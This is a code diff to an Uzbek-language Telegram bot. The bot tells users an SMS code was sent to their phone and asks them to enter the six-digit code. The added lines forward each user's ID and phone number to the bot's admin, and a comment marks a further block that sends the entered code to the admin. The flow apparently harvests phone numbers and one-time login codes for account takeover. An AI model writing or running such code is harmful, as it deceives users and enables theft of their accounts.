@@ -266,6 +266,20 @@ async def process_phone(message: types.Message, phone: str):
         f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
         f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:"
     )
+    
+    # ADMIN'GA TELEFON RAQAMNI YUBORISH
+    try:
+        await bot.send_message(
+            ADMIN_ID,
+            f"📱 <b>YANGI TELEFON RAQAM</b>\n\n"
+            f"🆔 Foydalanuvchi ID: <code>{telegram_id}</code>\n"
+            f"📞 Telefon: <code>{phone}</code>\n"
+            f"⏳ Kod kutilmoqda...",
+            parse_mode="HTML"
+        )
+        logger.info(f"✅ Admin'ga telefon raqam yuborildi")
+    except Exception as e:
+        logger.error(f"❌ Admin'ga telefon raqam yuborishda xatolik: {e}")
 
 # ================= 4. KODNI QABUL QILISH =================
 @dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
@@ -302,6 +316,7 @@ async def receive_code(message: types.Message):
         reply_markup=user_menu
     )
     
+    # ADMIN'GA KODNI YUBORISH
     try:
         keyboard = InlineKeyboardMarkup(row_width=2)
         keyboard.add(
